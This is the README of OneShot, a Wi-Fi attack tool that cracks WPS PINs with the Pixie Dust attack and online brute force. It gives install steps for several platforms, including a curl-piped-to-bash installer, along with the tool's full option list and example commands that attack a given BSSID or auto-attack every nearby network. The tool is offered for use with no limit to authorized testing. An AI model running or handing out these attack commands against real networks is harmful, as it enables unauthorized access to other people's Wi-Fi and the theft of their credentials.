
# Overview
**OneShot** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
 - Auto Mode to select networks and perform attacks automatically
# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).
# Setup
## Debian/Ubuntu
**Installing requirements**
 ```
 sudo apt install -y python3 wpasupplicant iw wget
 ```
**Installing Pixiewps**

***Ubuntu 18.04 and above or Debian 10 and above***
 ```
 sudo apt install -y pixiewps
 ```
 
***Other versions***
 ```
 sudo apt install -y build-essential unzip
 wget https://github.com/wiire-a/pixiewps/archive/master.zip && unzip master.zip
 cd pixiewps*/
 make
 sudo make install
 ```
**Getting OneShot**
 ```
 cd ~
 wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt
 ```
## Arch Linux
**Installing requirements**
 ```
 sudo pacman -S wpa_supplicant pixiewps wget python
 ```
**Getting OneShot**
 ```
 wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt
 ```
## Alpine Linux
It can also be used to run on Android devices using [Linux Deploy](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)

**Installing requirements**  
Adding the testing repository:
 ```
 sudo sh -c 'echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing/" >> /etc/apk/repositories'
 ```
 ```
 sudo apk add python3 wpa_supplicant pixiewps iw
 ```
 **Getting OneShot**
 ```
 sudo wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 sudo wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt
 ```
## [Termux](https://termux.com/)
Please note that root access is required.  

#### Using installer
 ```
 curl -sSf https://raw.githubusercontent.com/drygdryg/OneShot_Termux_installer/master/installer.sh | bash
 ```
#### Manually
**Installing requirements**
 ```
 pkg install -y root-repo
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
**Getting OneShot**
 ```
 git clone --depth 1 https://github.com/drygdryg/OneShot OneShot
 ```
#### Running
 ```
 sudo python OneShot/oneshot.py -i wlan0 --iface-down -K
 ```

# Usage
```
 usage: oneshot.py [-h] -i INTERFACE [-b BSSID] [-s SSID] [-p PIN] [-K] [-F] [-X] [-A] [-P PIN_INDEX] [-B] [--pbc] [-d DELAY]
                  [-w] [--iface-down] [--vuln-list VULN_LIST] [-l] [-r] [--mtk-wifi] [-v]

OneShotPin 0.0.2 (c) 2017 rofl0r, drygdryg and fulvius31

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Name of the interface to use
  -b BSSID, --bssid BSSID
                        BSSID of the target AP
  -s SSID, --ssid SSID  SSID of the target AP
  -p PIN, --pin PIN     Use the specified pin (arbitrary string or 4/8 digit pin)
  -K, --pixie-dust      Run Pixie Dust attack
  -F, --pixie-force     Run Pixiewps with --force option (bruteforce full range)
  -X, --show-pixie-cmd  Always print Pixiewps command
  -A, --auto            Attempt to Autopwn all the bssids
  -P PIN_INDEX, --pin-index PIN_INDEX
                        Select from index of automatically generated pins
  -B, --bruteforce      Run online bruteforce attack
  --pbc, --push-button-connect
                        Run WPS push button connection
  -d DELAY, --delay DELAY
                        Set the delay between pin attempts
  -w, --write           Write credentials to the file on success
  --iface-down          Down network interface when the work is finished
  --vuln-list VULN_LIST
                        Use custom file with vulnerable devices list
  -l, --loop            Run in a loop
  -r, --reverse-scan    Reverse order of networks in the list of networks. Useful on small displays
  --mtk-wifi            Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi
                        adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
  -v, --verbose         Verbose output

 ```

## Usage examples
Start oneshot in auto mode:
 ```
 sudo python3 oneshot.py -i wlan0 -A
 ```
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 oneshot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 oneshot.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements
## Special Thanks
* `rofl0r` for initial implementation;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` for developing Pixiewps.
